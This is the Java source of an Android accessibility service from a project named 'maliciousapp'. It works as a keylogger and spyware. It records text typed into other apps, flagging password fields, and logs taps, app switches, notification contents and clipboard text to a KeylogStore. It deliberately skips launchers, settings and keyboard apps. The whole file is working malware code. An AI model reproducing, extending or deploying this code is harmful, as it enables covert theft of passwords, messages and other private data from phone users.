package com.boltz.maliciousapp;

import android.accessibilityservice.AccessibilityService;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "MalService";
    private static final Set<String> IGNORED_PACKAGES = new HashSet<>(Arrays.asList(
            "com.google.android.apps.nexuslauncher",
            "com.android.launcher",
            "com.android.launcher3",
            "com.android.systemui",
            "com.android.settings",
            "com.android.packageinstaller",
            "com.google.android.permissioncontroller",
            "com.google.android.setupwizard",
            "com.android.inputmethod.latin",
            "com.google.android.inputmethod.latin",
            "com.samsung.android.honeyboard",
            "com.swiftkey.swiftkey",
            "com.boltz.maliciousapp"
    ));

    private String lastClipboard = "";
    private String lastInputText = "";
    private String lastInputPackage = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        String packageName = event.getPackageName() != null
                ? event.getPackageName().toString() : "unknown";

        if (IGNORED_PACKAGES.contains(packageName)) return;

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChanged(event, packageName);
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                handleClick(event, packageName);
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                handleWindowChange(event, packageName);
                break;
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                handleNotification(event, packageName);
                break;
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                checkClipboard(packageName);
                break;
        }
    }

    private void handleTextChanged(AccessibilityEvent event, String packageName) {
        AccessibilityNodeInfo source = event.getSource();
        if (source == null) return;

        CharSequence className = source.getClassName();
        if (className != null && className.toString().contains("EditText")) {
            CharSequence value = source.getText();
            if (value != null && value.length() > 0) {
                String text = value.toString();
                if (!text.equals(lastInputText) || !packageName.equals(lastInputPackage)) {
                    lastInputText = text;
                    lastInputPackage = packageName;

                    boolean isPassword = source.isPassword();
                    String label = isPassword ? "PASSWORD    " : "KEYSTROKE   ";
                    log(label, packageName, text);
                }
            }
        }
    }

    private void handleClick(AccessibilityEvent event, String packageName) {
        AccessibilityNodeInfo source = event.getSource();
        if (source == null) return;

        CharSequence text = source.getText();
        CharSequence desc = source.getContentDescription();
        String clickInfo = "";
        if (text != null && text.length() > 0) {
            clickInfo = text.toString();
        } else if (desc != null && desc.length() > 0) {
            clickInfo = "[" + desc + "]";
        }

        if (!clickInfo.isEmpty()) {
            log("CLICK       ", packageName, clickInfo);
        }
    }

    private void handleWindowChange(AccessibilityEvent event, String packageName) {
        CharSequence className = event.getClassName();
        if (className != null) {
            log("APP_SWITCH  ", packageName, className.toString());
        }
    }

    private void handleNotification(AccessibilityEvent event, String packageName) {
        if (event.getText() == null || event.getText().isEmpty()) return;

        StringBuilder sb = new StringBuilder();
        for (CharSequence cs : event.getText()) {
            if (cs != null) sb.append(cs).append(" ");
        }
        String content = sb.toString().trim();
        if (!content.isEmpty()) {
            log("NOTIFICATION", packageName, content);
        }
    }

    private void checkClipboard(String packageName) {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null || !cm.hasPrimaryClip()) return;

            ClipData clip = cm.getPrimaryClip();
            if (clip != null && clip.getItemCount() > 0) {
                CharSequence clipText = clip.getItemAt(0).getText();
                if (clipText != null && !clipText.toString().equals(lastClipboard)) {
                    lastClipboard = clipText.toString();
                    log("CLIPBOARD   ", packageName, lastClipboard);
                }
            }
        } catch (Exception ignored) {
        }
    }

    private void log(String label, String packageName, String data) {
        Log.d(TAG, label + " |  " + packageName + "  |  " + data);
        KeylogStore.write(this, label, packageName, data);
    }

    @Override
    public void onInterrupt() {
    }
}
